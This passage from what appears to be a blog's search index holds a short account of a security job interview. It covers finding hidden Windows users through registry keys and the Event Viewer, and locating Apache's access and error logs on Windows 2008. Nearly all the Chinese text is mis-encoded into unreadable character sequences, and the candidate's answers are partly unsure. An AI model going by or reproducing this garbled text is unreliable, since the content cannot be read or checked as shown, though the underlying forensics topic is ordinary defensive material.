usersæŸ¥çœ‹usersè¡¨é¡¹ä¸­ä¸namesè¡¨é¡¹ä¸­é¡¹æ•°é‡æ˜¯å¦ä¸€è‡´å¦‚æœä¸€è‡´å°±æ²¡æœ‰éšè—ç”¨æˆ·å¦‚æœä¸ä¸€è‡´ï¼Œå°±å¯¹ç…§å…¶ä»–ç”µè„‘ç”¨æˆ·æ³¨å†Œè¡¨ï¼Œå³å¯æ‰¾å‡ºå…¶ä»–éšè—ç”¨æˆ·äº‹ä»¶æŸ¥çœ‹å™¨ï¼ŒæŸ¥çœ‹å¼‚å¸¸äº‹ä»¶ï¼‰</p>
<h3 id="é‚£ä½ æ˜¯æ€ä¹ˆå»æŸ¥çœ‹æ—¥å¿—çš„å‘¢ï¼Ÿ"><a href="#é‚£ä½ æ˜¯æ€ä¹ˆå»æŸ¥çœ‹æ—¥å¿—çš„å‘¢ï¼Ÿ" class="headerlink" title="é‚£ä½ æ˜¯æ€ä¹ˆå»æŸ¥çœ‹æ—¥å¿—çš„å‘¢ï¼Ÿ"></a>é‚£ä½ æ˜¯æ€ä¹ˆå»æŸ¥çœ‹æ—¥å¿—çš„å‘¢ï¼Ÿ</h3><p>ç­”ï¼šé‚£ä¸ªç³»ç»Ÿæ˜¯å¥½åƒä¸€ä¸ªwindow2008ï¼Œä½¿ç”¨çš„æ˜¯Apacheï¼Œä¸€èˆ¬Apacheçš„æ—¥å¿—å¥½åƒæ˜¯httpd</p>
<h3 id="æ˜¯httpdå—ï¼Ÿ"><a href="#æ˜¯httpdå—ï¼Ÿ" class="headerlink" title="æ˜¯httpdå—ï¼Ÿ"></a>æ˜¯httpdå—ï¼Ÿ</h3><p>ç­”ï¼šè¿™ä¸ªæˆ‘æœ‰äº›å¿˜è®°äº†ï¼Œä¸å¥½æ„æ€ï¼ˆå½“æ—¶æ²¡æƒ³å‡ºæ¥ï¼Œlogs/access.logå’Œlog/error.logï¼‰</p>
<h3 id="hrï¼šè¡Œï¼Œä½ çš„æƒ…å†µæˆ‘å¤§ä½“äº†è§£äº†ï¼Œå½“æ—¶å€™ä¼šç»™ä¸ªæ•´ä½“åé¦ˆï¼Œå†è§ã€‚"><a href="#hrï¼šè¡Œï¼Œä½ çš„æƒ…å†µæˆ‘å¤§ä½“äº†è§£äº†ï¼Œå½“æ—¶å€™ä¼šç»™ä¸ªæ•´ä½“åé¦ˆï¼Œå†è§ã€‚" class="headerlink" title="hrï¼šè¡Œï¼Œä½ çš„æƒ…å†µæˆ‘å¤§ä½“äº†è§£äº†ï¼Œå½“æ—¶å€™ä¼šç»™ä¸ªæ•´ä½“åé¦ˆï¼Œå†è§ã€‚"></a>hrï¼šè¡Œï¼Œä½ çš„æƒ…å†µæˆ‘å¤§ä½“äº†è§£äº†ï¼Œå½“æ—¶å€™ä¼šç»™ä¸ªæ•´ä½“åé¦ˆï¼Œå†è§ã€‚</h3><p>ç­”ï¼šå¥½çš„ï¼Œéº»çƒ¦æ‚¨äº†ï¼Œå†è§~</p>
<p><em>é¢è¯•æ¥çš„æŒºçªç„¶çš„ï¼Œå½“æ—¶åˆšè¦å»å‡ºå»åƒæ™šé¥­ï¼Œæ€»å…±èŠäº†10åˆ†é’Ÿï¼Œæ„Ÿè§‰å›ç­”çš„ä¸æ˜¯å¾ˆå¥½ï¼Œæœ€åå‡‰äº†ğŸ˜­</em></p>
]]></content>
      <categories>
        <category>é¢è¯•</category>
      </categories>
      <tags>
        <tag>é¢è¯•</tag>
      </tags>
  </entry>
</search>
